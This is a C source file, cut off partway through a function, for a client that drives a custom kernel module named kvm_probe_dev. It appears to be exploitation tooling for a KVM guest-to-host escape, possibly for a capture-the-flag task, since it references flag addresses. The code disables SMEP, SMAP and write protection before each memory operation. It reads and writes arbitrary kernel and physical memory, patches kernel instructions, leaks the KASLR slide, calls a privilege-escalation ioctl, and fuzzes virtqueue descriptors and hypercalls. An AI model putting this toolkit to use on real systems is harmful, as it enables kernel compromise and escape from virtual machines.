#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/time.h>

/* IOCTL Definitions */
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_LOOKUP_SYMBOL      0x1013
#define IOCTL_GET_KERNEL_BASE    0x1014
#define IOCTL_DISABLE_SMEP       0x1015
#define IOCTL_DISABLE_SMAP       0x1016
#define IOCTL_DISABLE_WP         0x1017
#define IOCTL_READ_CR4           0x1018
#define IOCTL_WRITE_CR4          0x1019
#define IOCTL_READ_MSR           0x101A
#define IOCTL_WRITE_MSR          0x101B
#define IOCTL_GET_CURRENT_TASK   0x101C
#define IOCTL_ESCALATE_PRIVILEGES 0x101D
#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_WRITE_PHYSICAL     0x101F
#define IOCTL_ALLOC_ROOT_PAGES   0x1020
#define IOCTL_ENABLE_NX          0x1021
#define IOCTL_DISABLE_NX         0x1022
#define IOCTL_READ_EFER          0x1023
#define IOCTL_WRITE_EFER         0x1024
#define IOCTL_ENABLE_SMEP        0x1025
#define IOCTL_ENABLE_SMAP        0x1026
#define IOCTL_ENABLE_WP          0x1027
#define IOCTL_READ_CR0           0x1028
#define IOCTL_WRITE_CR0          0x1029
#define IOCTL_CHECK_STATUS       0x102A

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

/* Structures */
struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vq_desc_user_data {
    uint16_t index;
    uint64_t phys_addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct patch_req {
    unsigned long dst_va;
    unsigned long size;
    unsigned char *user_buf;
};

struct symbol_lookup {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
};

struct msr_data {
    unsigned int msr;
    unsigned long long value;
};

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
};

/* Leak detection structure */
struct leak_candidate {
    unsigned long addr;
    unsigned char data[16];
    int confidence;
    char source[64];
};

/* Global variables */
static int fd = -1;
static volatile int crash_monitor_running = 0;
static pthread_t crash_thread;
static FILE *vq_fuzz_log = NULL;
static FILE *msr_fuzz_log = NULL;
static FILE *dma_probe_log = NULL;
static FILE *leak_log = NULL;

static struct leak_candidate g_leak_candidates[100];
static int g_leak_count = 0;

/* Helper: minimum function */
static size_t min(size_t a, size_t b) {
    return a < b ? a : b;
}

/* Utility: safe write to log */
static void safe_log(FILE *f, const char *fmt, ...) {
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    fflush(f);
    va_end(ap);
}

/* Initialize the driver connection */
int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return -1;
    }
    srand(time(NULL) ^ getpid());
    printf("[+] Driver initialized\n");
    return 0;
}

/* Automatically disable protections before operations */
static void auto_disable_protections(void) {
    ioctl(fd, IOCTL_DISABLE_SMEP, 0);
    ioctl(fd, IOCTL_DISABLE_SMAP, 0);
    ioctl(fd, IOCTL_DISABLE_WP, 0);
}

/* ========================================================================
 * ENHANCED DISPLAY FUNCTIONS
 * ======================================================================== */

/* Convert hex string to bytes (handles little-endian) */
static int hex_to_bytes(const char *hex_str, unsigned char *bytes, size_t max_len) {
    size_t hex_len = strlen(hex_str);
    if (hex_len % 2 != 0) return -1;
    
    size_t byte_len = hex_len / 2;
    if (byte_len > max_len) return -1;
    
    for (size_t i = 0; i < byte_len; i++) {
        sscanf(hex_str + (2 * i), "%2hhx", &bytes[i]);
    }
    
    return byte_len;
}

/* Check if buffer contains trigger pattern (supports ASCII and hex) */
static int contains_trigger(unsigned char *buf, size_t buf_len, const char *trigger, 
                           unsigned long *match_offset) {
    size_t trigger_len = strlen(trigger);
    
    /* Try ASCII match first */
    for (size_t i = 0; i <= buf_len - trigger_len; i++) {
        if (memcmp(buf + i, trigger, trigger_len) == 0) {
            *match_offset = i;
            return 1; /* ASCII match */
        }
    }
    
    /* Try hex match (little-endian) */
    unsigned char hex_bytes[16];
    int hex_len = hex_to_bytes(trigger, hex_bytes, sizeof(hex_bytes));
    
    if (hex_len > 0 && (size_t)hex_len <= buf_len) {
        for (size_t i = 0; i <= buf_len - hex_len; i++) {
            if (memcmp(buf + i, hex_bytes, hex_len) == 0) {
                *match_offset = i;
                return 2; /* Hex match */
            }
        }
    }
    
    return 0; /* No match */
}

/* Display memory in enhanced format with hex + ASCII */
static void display_memory(unsigned char *buf, unsigned long addr, size_t size, 
                          const char *trigger, unsigned long head, unsigned long tail) {
    if (!buf || size == 0) return;
    
    unsigned long start_addr = addr;
    unsigned long end_addr = addr + size;
    
    /* If trigger is specified, find it first */
    if (trigger && strlen(trigger) > 0) {
        int found = 0;
        
        for (unsigned long offset = 0; offset < size; offset += 16) {
            unsigned long current_addr = addr + offset;
            size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
            
            unsigned long match_offset;
            int match_type = contains_trigger(buf + offset, line_size, trigger, &match_offset);
            
            if (match_type > 0) {
                if (!found) {
                    if (match_type == 1) {
                        printf("!!!Trigger found %s at 0x%lx\n", trigger, current_addr + match_offset);
                    } else {
                        printf("!!!Trigger found %s(little endian) at 0x%lx\n", trigger, current_addr + match_offset);
                    }
                    found = 1;
                }
                
                /* Calculate head and tail ranges */
                unsigned long head_start = (current_addr >= head) ? (current_addr - head) : addr;
                unsigned long tail_end = (current_addr + 16 + tail <= end_addr) ? 
                                        (current_addr + 16 + tail) : end_addr;
                
                /* Adjust to 16-byte boundaries */
                head_start = (head_start / 16) * 16;
                tail_end = ((tail_end + 15) / 16) * 16;
                if (tail_end > end_addr) tail_end = end_addr;
                
                /* Display from head to tail */
                for (unsigned long disp_addr = head_start; disp_addr < tail_end; disp_addr += 16) {
                    unsigned long disp_offset = disp_addr - addr;
                    size_t disp_size = (disp_offset + 16 <= size) ? 16 : (size - disp_offset);
                    
                    printf("0x%lx: ", disp_addr);
                    
                    /* Hex bytes */
                    for (size_t i = 0; i < 16; i++) {
                        if (i < disp_size) {
                            printf("%02x ", buf[disp_offset + i]);
                        } else {
                            printf("   ");
                        }
                    }
                    
                    printf("  |  ");
                    
                    /* ASCII representation */
                    for (size_t i = 0; i < disp_size; i++) {
                        unsigned char c = buf[disp_offset + i];
                        printf("%c", isprint(c) ? c : '.');
                    }
                    
                    printf("\n");
                }
                
                return; /* Only show first match with context */
            }
        }
        
        if (!found) {
            printf("[-] Trigger '%s' not found in scanned range\n", trigger);
        }
        
        return;
    }
    
    /* No trigger - display all */
    for (unsigned long offset = 0; offset < size; offset += 16) {
        unsigned long current_addr = addr + offset;
        size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
        
        printf("0x%lx: ", current_addr);
        
        /* Hex bytes */
        for (size_t i = 0; i < 16; i++) {
            if (i < line_size) {
                printf("%02x ", buf[offset + i]);
            } else {
                printf("   ");
            }
        }
        
        printf("  |  ");
        
        /* ASCII representation */
        for (size_t i = 0; i < line_size; i++) {
            unsigned char c = buf[offset + i];
            printf("%c", isprint(c) ? c : '.');
        }
        
        printf("\n");
    }
}

/* ========================================================================
 * ADAPTIVE LEAK DETECTION FUNCTIONS
 * ======================================================================== */

/* Check if data looks like a kernel pointer */
static int looks_like_kernel_pointer(unsigned long value) {
    /* Kernel pointers typically in these ranges */
    if (value >= 0xffff800000000000UL && value <= 0xffffffffffffffffUL) {
        return 1;
    }
    return 0;
}

/* Analyze memory for potential leaks */
static int analyze_for_leaks(unsigned char *buf, size_t size, unsigned long base_addr, const char *source) {
    int leaks_found = 0;
    
    for (size_t i = 0; i <= size - 8; i++) {
        unsigned long value = *(unsigned long *)(buf + i);
        
        if (looks_like_kernel_pointer(value)) {
            if (g_leak_count < 100) {
                struct leak_candidate *leak = &g_leak_candidates[g_leak_count];
                leak->addr = base_addr + i;
                memcpy(leak->data, buf + i, 16);
                leak->confidence = 1;
                snprintf(leak->source, sizeof(leak->source), "%s", source);
                
                printf("[!] POTENTIAL LEAK at 0x%lx: 0x%lx (from %s)\n", 
                       leak->addr, value, source);
                
                if (leak_log) {
                    fprintf(leak_log, "[!] POTENTIAL LEAK at 0x%lx: 0x%lx (from %s)\n", 
                           leak->addr, value, source);
                    fflush(leak_log);
                }
                
                g_leak_count++;
                leaks_found++;
            }
        }
    }
    
    return leaks_found;
}

/* Safe memory read with leak detection */
static int safe_read_with_leak_check(unsigned long addr, size_t size, const char *source) {
    unsigned char *buf = malloc(size);
    if (!buf) return -1;
    
    struct physical_rw req = {
        .phys_addr = addr,
        .size = size,
        .user_buffer = buf
    };
    
    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
        free(buf);
        return -1;
    }
    
    int leaks = analyze_for_leaks(buf, size, addr, source);
    free(buf);
    return leaks;
}

/* Check if system is still responsive */
static int check_system_health(void) {
    /* Try a simple read operation */
    unsigned long test_addr = 0x1000;
    unsigned char buf[16];
    
    struct physical_rw req = {
        .phys_addr = test_addr,
        .size = sizeof(buf),
        .user_buffer = buf
    };
    
    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
        return 0; /* System may be compromised */
    }
    
    return 1; /* System responsive */
}

/* ========================================================================
 * ENHANCED MEMORY OPERATIONS
 * ======================================================================== */

void read_kernel_mem(unsigned long addr, unsigned long size, const char *trigger, 
                     unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct kvm_kernel_mem_read req = {
        .kernel_addr = addr,
        .length = size,
        .user_buf = buf
    };

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("read_kernel_mem failed");
        free(buf);
        return;
    }

    display_memory(buf, addr, size, trigger, head, tail);
    free(buf);
}

void read_physical_mem(unsigned long phys_addr, unsigned long size, const char *trigger,
                       unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct physical_rw req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = buf
    };

    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
        perror("read_physical_mem failed");
        free(buf);
        return;
    }

    display_memory(buf, phys_addr, size, trigger, head, tail);
    free(buf);
}

void read_mmio(unsigned long phys_addr, unsigned long size, const char *trigger,
               unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct mmio_data req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = buf,
        .single_value = 0,
        .value_size = 0
    };

    if (ioctl(fd, IOCTL_READ_MMIO, &req) < 0) {
        perror("read_mmio failed");
        free(buf);
        return;
    }

    display_memory(buf, phys_addr, size, trigger, head, tail);
    free(buf);
}

/* ========================================================================
 * SCAN OPERATIONS
 * ======================================================================== */

void scan_physical_mem(unsigned long start_addr, unsigned long end_addr, const char *trigger,
                       unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    if (end_addr <= start_addr) {
        printf("[-] Error: end address must be greater than start address\n");
        return;
    }
    
    unsigned long size = end_addr - start_addr;
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct physical_rw req = {
        .phys_addr = start_addr,
        .size = size,
        .user_buffer = buf
    };

    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
        perror("scan_physical_mem failed");
        free(buf);
        return;
    }

    display_memory(buf, start_addr, size, trigger, head, tail);
    free(buf);
}

void scan_kernel_mem(unsigned long start_addr, unsigned long end_addr, const char *trigger,
                     unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    if (end_addr <= start_addr) {
        printf("[-] Error: end address must be greater than start address\n");
        return;
    }
    
    unsigned long size = end_addr - start_addr;
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct kvm_kernel_mem_read req = {
        .kernel_addr = start_addr,
        .length = size,
        .user_buf = buf
    };

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("scan_kernel_mem failed");
        free(buf);
        return;
    }

    display_memory(buf, start_addr, size, trigger, head, tail);
    free(buf);
}

void scan_mmio(unsigned long start_addr, unsigned long end_addr, const char *trigger,
               unsigned long head, unsigned long tail) {
    auto_disable_protections();
    
    if (end_addr <= start_addr) {
        printf("[-] Error: end address must be greater than start address\n");
        return;
    }
    
    unsigned long size = end_addr - start_addr;
    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("malloc failed");
        return;
    }

    struct mmio_data req = {
        .phys_addr = start_addr,
        .size = size,
        .user_buffer = buf,
        .single_value = 0,
        .value_size = 0
    };

    if (ioctl(fd, IOCTL_READ_MMIO, &req) < 0) {
        perror("scan_mmio failed");
        free(buf);
        return;
    }

    display_memory(buf, start_addr, size, trigger, head, tail);
    free(buf);
}

/* ========================================================================
 * WRITE OPERATIONS
 * ======================================================================== */

void write_kernel_mem(unsigned long addr, unsigned char *data, unsigned long size) {
    auto_disable_protections();
    
    struct kvm_kernel_mem_write req = {
        .kernel_addr = addr,
        .length = size,
        .user_buf = data
    };

    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("write_kernel_mem failed");
        return;
    }

    printf("[+] Wrote %lu bytes to kernel address 0x%lx\n", size, addr);
}

void write_physical_mem(unsigned long phys_addr, unsigned char *data, unsigned long size) {
    auto_disable_protections();
    
    struct physical_rw req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = data
    };

    if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) < 0) {
        perror("write_physical_mem failed");
        return;
    }

    printf("[+] Wrote %lu bytes to physical address 0x%lx\n", size, phys_addr);
}

void patch_kernel(unsigned long addr, unsigned char *code, unsigned long size) {
    auto_disable_protections();
    
    struct patch_req req = {
        .dst_va = addr,
        .size = size,
        .user_buf = code
    };

    if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
        perror("patch_kernel failed");
        return;
    }

    printf("[+] Patched %lu bytes at kernel address 0x%lx\n", size, addr);
}

void write_mmio(unsigned long phys_addr, unsigned long size, unsigned long value) {
    auto_disable_protections();
    
    struct mmio_data req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = NULL,
        .single_value = value,
        .value_size = size
    };

    if (ioctl(fd, IOCTL_WRITE_MMIO, &req) < 0) {
        perror("write_mmio failed");
        return;
    }

    printf("[+] Wrote 0x%lx to MMIO address 0x%lx (size=%lu)\n", value, phys_addr, size);
}

/* ========================================================================
 * CORE COMMANDS
 * ======================================================================== */

void virt_to_phys(unsigned long va) {
    unsigned long pa = va;
    printf("[+] Attempting VIRT_TO_PHYS: 0x%lx\n", va);
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &pa) < 0) {
        perror("virt_to_phys failed");
        return;
    }
    printf("[+] Virtual 0x%lx -> Physical 0x%lx\n", va, pa);
}

void alloc_vq_page(void) {
    unsigned long pfn;
    if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn) < 0) {
        perror("alloc_vq_page failed");
        return;
    }
    printf("[+] Allocated VQ page at PFN: 0x%lx\n", pfn);
}

void free_vq_page(void) {
    if (ioctl(fd, IOCTL_FREE_VQ_PAGE, 0) < 0) {
        perror("free_vq_page failed");
        return;
    }
    printf("[+] Freed VQ page\n");
}

/* ========================================================================
 * REGISTER OPERATIONS
 * ======================================================================== */

void read_efer(void) {
    unsigned long long efer;
    if (ioctl(fd, IOCTL_READ_EFER, &efer) < 0) {
        perror("read_efer failed");
        return;
    }
    printf("[+] EFER = 0x%llx\n", efer);
    printf("[+] NX bit (EFER.NXE): %s\n", (efer & (1ULL << 11)) ? "ENABLED" : "DISABLED");
}

void enable_nx(void) {
    unsigned long long before = 0, after = 0;
    if (ioctl(fd, IOCTL_READ_EFER, &before) < 0) {
        perror("enable_nx: read EFER failed (before)");
        return;
    }
    printf("[*] EFER before: 0x%llx (NXE=%s)\n", before, (before & (1ULL<<11)) ? "1" : "0");
    if (ioctl(fd, IOCTL_ENABLE_NX, 0) < 0) {
        perror("enable_nx failed");
        return;
    }
    if (ioctl(fd, IOCTL_READ_EFER, &after) < 0) {
        perror("enable_nx: read EFER failed (after)");
        return;
    }
    printf("[+] EFER after:  0x%llx (NXE=%s)\n", after, (after & (1ULL<<11)) ? "1" : "0");
    if ( (before & (1ULL<<11)) == 0 && (after & (1ULL<<11)) != 0 ) {
        printf("[+] NX bit successfully enabled\n");
    } else if ((after & (1ULL<<11)) != 0) {
        printf("[+] NX bit already enabled\n");
    } else {
        printf("[-] NX bit NOT enabled (driver/hypervisor may have blocked the change)\n");
    }
}

void disable_nx(void) {
    unsigned long long before = 0, after = 0;
    if (ioctl(fd, IOCTL_READ_EFER, &before) < 0) {
        perror("disable_nx: read EFER failed (before)");
        return;
    }
    printf("[*] EFER before: 0x%llx (NXE=%s)\n", before, (before & (1ULL<<11)) ? "1" : "0");
    if (ioctl(fd, IOCTL_DISABLE_NX, 0) < 0) {
        perror("disable_nx failed");
        return;
    }
    if (ioctl(fd, IOCTL_READ_EFER, &after) < 0) {
        perror("disable_nx: read EFER failed (after)");
        return;
    }
    printf("[+] EFER after:  0x%llx (NXE=%s)\n", after, (after & (1ULL<<11)) ? "1" : "0");
    if ( (before & (1ULL<<11)) != 0 && (after & (1ULL<<11)) == 0 ) {
        printf("[+] NX bit successfully disabled\n");
    } else if ((after & (1ULL<<11)) == 0) {
        printf("[+] NX bit already disabled\n");
    } else {
        printf("[-] NX bit NOT disabled (driver/hypervisor may have blocked the change)\n");
    }
}

void read_cr0(void) {
    unsigned long cr0;
    if (ioctl(fd, IOCTL_READ_CR0, &cr0) < 0) {
        perror("read_cr0 failed");
        return;
    }
    printf("[+] CR0 = 0x%lx\n", cr0);
    printf("[+] WP bit (CR0.WP): %s\n", (cr0 & (1UL << 16)) ? "ENABLED" : "DISABLED");
}

void write_cr0(unsigned long value) {
    if (ioctl(fd, IOCTL_WRITE_CR0, &value) < 0) {
        perror("write_cr0 failed");
        return;
    }
    printf("[+] CR0 written with 0x%lx\n", value);
}

void read_cr4(void) {
    unsigned long cr4;
    if (ioctl(fd, IOCTL_READ_CR4, &cr4) < 0) {
        perror("read_cr4 failed");
        return;
    }
    printf("[+] CR4 = 0x%lx\n", cr4);
    printf("[+] SMEP bit (CR4.SMEP): %s\n", (cr4 & (1UL << 20)) ? "ENABLED" : "DISABLED");
    printf("[+] SMAP bit (CR4.SMAP): %s\n", (cr4 & (1UL << 21)) ? "ENABLED" : "DISABLED");
}

void write_cr4(unsigned long value) {
    if (ioctl(fd, IOCTL_WRITE_CR4, &value) < 0) {
        perror("write_cr4 failed");
        return;
    }
    printf("[+] CR4 written with 0x%lx\n", value);
}

void read_msr(unsigned int msr) {
    struct msr_data req = { .msr = msr, .value = 0 };
    if (ioctl(fd, IOCTL_READ_MSR, &req) < 0) {
        perror("read_msr failed");
        return;
    }
    printf("[+] MSR 0x%x = 0x%llx\n", msr, req.value);
}

void write_msr(unsigned int msr, unsigned long long value) {
    struct msr_data req = { .msr = msr, .value = value };
    if (ioctl(fd, IOCTL_WRITE_MSR, &req) < 0) {
        perror("write_msr failed");
        return;
    }
    printf("[+] MSR 0x%x written with 0x%llx\n", msr, value);
}

void enable_smep(void) {
    if (ioctl(fd, IOCTL_ENABLE_SMEP, 0) < 0) {
        perror("enable_smep failed");
        return;
    }
    printf("[+] SMEP enabled\n");
}

void enable_smap(void) {
    if (ioctl(fd, IOCTL_ENABLE_SMAP, 0) < 0) {
        perror("enable_smap failed");
        return;
    }
    printf("[+] SMAP enabled\n");
}

void enable_wp(void) {
    if (ioctl(fd, IOCTL_ENABLE_WP, 0) < 0) {
        perror("enable_wp failed");
        return;
    }
    printf("[+] Write Protection enabled\n");
}

/* ========================================================================
 * I/O OPERATIONS
 * ======================================================================== */

void read_port(unsigned short port, unsigned int size) {
    struct port_io_data req = {
        .port = port,
        .size = size,
        .value = 0
    };

    if (ioctl(fd, IOCTL_READ_PORT, &req) < 0) {
        perror("read_port failed");
        return;
    }

    printf("[+] Read from port 0x%x (size=%u): 0x%x\n", port, size, req.value);
}

void write_port(unsigned short port, unsigned int size, unsigned int value) {
    struct port_io_data req = {
        .port = port,
        .size = size,
        .value = value
    };

    if (ioctl(fd, IOCTL_WRITE_PORT, &req) < 0) {
        perror("write_port failed");
        return;
    }

    printf("[+] Wrote 0x%x to port 0x%x (size=%u)\n", value, port, size);
}

/* ========================================================================
 * SYMBOL AND INFO COMMANDS  
 * ======================================================================== */

void lookup_symbol(const char *symbol_name) {
    struct symbol_lookup req;
    strncpy(req.name, symbol_name, MAX_SYMBOL_NAME - 1);
    req.name[MAX_SYMBOL_NAME - 1] = '\0';

    if (ioctl(fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) {
        perror("lookup_symbol failed");
        return;
    }

    printf("[+] Symbol '%s' is at address 0x%lx\n", symbol_name, req.address);
}

void get_kernel_base(void) {
    unsigned long base;
    if (ioctl(fd, IOCTL_GET_KERNEL_BASE, &base) < 0) {
        perror("get_kernel_base failed");
        return;
    }
    printf("[+] Kernel base address: 0x%lx\n", base);
}

void get_kaslr_slide(void) {
    unsigned long slide;
    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) {
        perror("get_kaslr_slide failed");
        return;
    }
    printf("[+] KASLR slide: 0x%lx\n", slide);
}

void get_current_task(void) {
    unsigned long task;
    if (ioctl(fd, IOCTL_GET_CURRENT_TASK, &task) < 0) {
        perror("get_current_task failed");
        return;
    }
    printf("[+] Current task_struct: 0x%lx\n", task);
}

void escalate_privileges(void) {
    if (ioctl(fd, IOCTL_ESCALATE_PRIVILEGES, 0) < 0) {
        perror("escalate_privileges failed");
        return;
    }
    printf("[+] Privilege escalation attempted\n");
}

void check_status(void) {
    unsigned long status;
    if (ioctl(fd, IOCTL_CHECK_STATUS, &status) < 0) {
        perror("check_status failed");
        return;
    }
    printf("[+] Driver status: 0x%lx\n", status);
}

/* ========================================================================
 * HYPERCALL COMMANDS
 * ======================================================================== */

void trigger_hypercall(void) {
    long ret;
    if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) {
        perror("trigger_hypercall failed");
        return;
    }
    printf("[+] Hypercall triggered, returned: %ld\n", ret);
}

void hypercall_with_args(unsigned long nr, unsigned long a0, unsigned long a1,
                         unsigned long a2, unsigned long a3) {
    struct hypercall_args args = {
        .nr = nr,
        .arg0 = a0,
        .arg1 = a1,
        .arg2 = a2,
        .arg3 = a3
    };

    if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
        perror("hypercall_with_args failed");
        return;
    }

    printf("[+] Hypercall %lu executed with args: 0x%lx 0x%lx 0x%lx 0x%lx\n",
           nr, a0, a1, a2, a3);
}

/* ========================================================================
 * SECTION 5: AUTOMATION HARNESSES (Original VQ/DMA/MSR Fuzzing)
 * ======================================================================== */

void vq_fuzz(int iterations, int max_index, int mode, int trigger_every) {
    if (!vq_fuzz_log) {
        vq_fuzz_log = fopen("vq_fuzz.log", "a");
        if (!vq_fuzz_log) {
            perror("vq_fuzz: fopen");
            return;
        }
    }

    safe_log(vq_fuzz_log, "=== vq_fuzz start: iterations=%d max_index=%d mode=%d trigger_every=%d ===\n",
             iterations, max_index, mode, trigger_every);

    alloc_vq_page();
    for (int i = 0; i < iterations; i++) {
        struct vq_desc_user_data desc;
        memset(&desc, 0, sizeof(desc));

        if (mode == 0) {
            /* random */
            desc.index = rand() % (max_index + 1);
            desc.phys_addr = ((uint64_t)rand() << 32) ^ rand();
            desc.len = (uint32_t)rand();
            desc.flags = rand() & 0xffff;
            desc.next_idx = rand() % (max_index + 1);
        } else if (mode == 1) {
            /* patterned */
            int pattern = i % 4;
            desc.index = pattern % (max_index + 1);
            if (pattern == 0) desc.len = 0;
            else if (pattern == 1) desc.len = 0xffffffff;
            else if (pattern == 2) desc.len = 0x80000000;
            else desc.len = 0xfffffffe;
            desc.phys_addr = (uint64_t)0x1000 * (i + 1);
            desc.flags = 0;
            desc.next_idx = (desc.index + 1) % (max_index + 1);
        } else {
            /* circular chains */
            int base = (i % (max_index + 1));
            if (i % 3 == 0) {
                desc.index = base;
                desc.phys_addr = 0x1000 + base * 0x1000;
                desc.len = 0x100;
                desc.flags = 1;
                desc.next_idx = (base + 1) % (max_index + 1);
            } else if (i % 3 == 1) {
                desc.index = (base + 1) % (max_index + 1);
                desc.phys_addr = 0x2000 + base * 0x1000;
                desc.len = 0x200;
                desc.flags = 1;
                desc.next_idx = (base + 2) % (max_index + 1);
            } else {
                desc.index = (base + 2) % (max_index + 1);
                desc.phys_addr = 0x3000 + base * 0x1000;
                desc.len = 0x300;
                desc.flags = 1;
                desc.next_idx = base;
            }
        }

        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) < 0) {
            safe_log(vq_fuzz_log, "[%d] IOCTL_WRITE_VQ_DESC failed idx=%u err=%s\n",
                     i, desc.index, strerror(errno));
        } else {
            safe_log(vq_fuzz_log, "[%d] wrote desc idx=%u pa=0x%llx len=0x%x flags=0x%x next=%u\n",
                     i, desc.index, (unsigned long long)desc.phys_addr, desc.len, desc.flags, desc.next_idx);
        }

        if (trigger_every > 0 && (i % trigger_every) == 0) {
            long ret = 0;
            if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) == 0) {
                safe_log(vq_fuzz_log, "[%d] trigger_hypercall ret=%ld\n", i, ret);
            } else {
                safe_log(vq_fuzz_log, "[%d] trigger_hypercall failed: %s\n", i, strerror(errno));
            }
        }
    }

    free_vq_page();
    safe_log(vq_fuzz_log, "=== vq_fuzz end ===\n");
}

void dma_probe(int pages, int pattern, int trigger) {
    if (pages <= 0 || pages > 16) pages = 8;
    if (!dma_probe_log) {
        dma_probe_log = fopen("dma_probe.log", "a");
        if (!dma_probe_log) {
            perror("dma_probe: fopen");
            return;
        }
    }

    safe_log(dma_probe_log, "=== dma_probe start: pages=%d pattern=%d trigger=%d ===\n",
             pages, pattern, trigger);

    unsigned long phys_addrs[16] = {0};
    if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_addrs) != 0) {
        safe_log(dma_probe_log, "ALLOC_ROOT_PAGES ioctl failed: %s\n", strerror(errno));
        return;
    }

    safe_log(dma_probe_log, "Allocated physical pages:\n");
    for (int i = 0; i < pages; i++) {
        safe_log(dma_probe_log, "  [%d] phys = 0x%lx\n", i, phys_addrs[i]);
    }

    for (int i = 0; i < pages; i++) {
        unsigned long phys = phys_addrs[i];
        unsigned char buf[4096];
        if (pattern == 0) {
            for (int j = 0; j < 4096; j++) buf[j] = (unsigned char)((i + j) & 0xff);
        } else if (pattern == 1) {
            memset(buf, 0x41, sizeof(buf));
        } else {
            for (int j = 0; j < 4096; j++) buf[j] = (unsigned char)(rand() & 0xff);
        }

        struct physical_rw req = {
            .phys_addr = phys,
            .size = sizeof(buf),
            .user_buffer = buf
        };

        if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) != 0) {
            safe_log(dma_probe_log, "WRITE_PHYSICAL failed for phys 0x%lx: %s\n", phys, strerror(errno));
        } else {
            safe_log(dma_probe_log, "WROTE pattern to phys 0x%lx\n", phys);
        }
    }

    alloc_vq_page();
    for (int i = 0; i < pages; i++) {
        struct vq_desc_user_data desc = {
            .index = (uint16_t)(i & 0xff),
            .phys_addr = (uint64_t)phys_addrs[i],
            .len = 4096,
            .flags = 0,
            .next_idx = (uint16_t)((i + 1) & 0xff)
        };
        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) != 0) {
            safe_log(dma_probe_log, "WRITE_VQ_DESC failed for desc %d: %s\n", i, strerror(errno));
        } else {
            safe_log(dma_probe_log, "WROTE VQ desc idx=%u -> phys=0x%llx\n", desc.index, (unsigned long long)desc.phys_addr);
        }
    }

    if (trigger) {
        long ret;
        if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) == 0) {
            safe_log(dma_probe_log, "Trigger hypercall returned %ld\n", ret);
        } else {
